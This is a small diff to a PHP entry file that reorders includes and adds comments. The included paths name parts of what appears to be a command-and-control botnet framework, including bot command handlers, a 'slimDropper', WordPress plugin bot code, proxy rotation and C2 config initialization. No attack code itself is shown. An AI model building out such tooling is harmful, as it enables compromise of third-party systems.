@@ -1,5 +1,8 @@
 <?php
 
+// auto load
+include "lib/vendor/autoload.php";
+// custom php classes
 include "lib/curlStuff/validateMeMore/talkToMeDamnit.php";
 include "lib/bots/bot_cmds/doMyBidding.php";
 include "lib/bots/bot_coms/listenToMe.php";
@@ -14,7 +17,6 @@ include "lib/logos/art/artisticStuff.php";
 include "lib/logos/menus/mainMenu.php";
 include "lib/new_bots/makeMeSlim/slimDropper.php";
 include "lib/proxies/populateRandomProxies.php";
-include "lib/vendor/autoload.php";
 include "lib/userAgents/agentsList.php";
 include "lib/initialization/slop_pg/slop_pg.php";
 include "lib/database/slopPgSql.php";
@@ -24,7 +26,6 @@ include "lib/initialization/initializeC2/initializeC2ConfigFile.php";
 include "lib/new_bots/wordpressPlugins/makeMeWordPressing.php";
 include "lib/curlStuff/mainCurl.php";
 include "lib/crypto/certMaker/certGenerator.php";
-
 
 use config\defaultConfig;
 
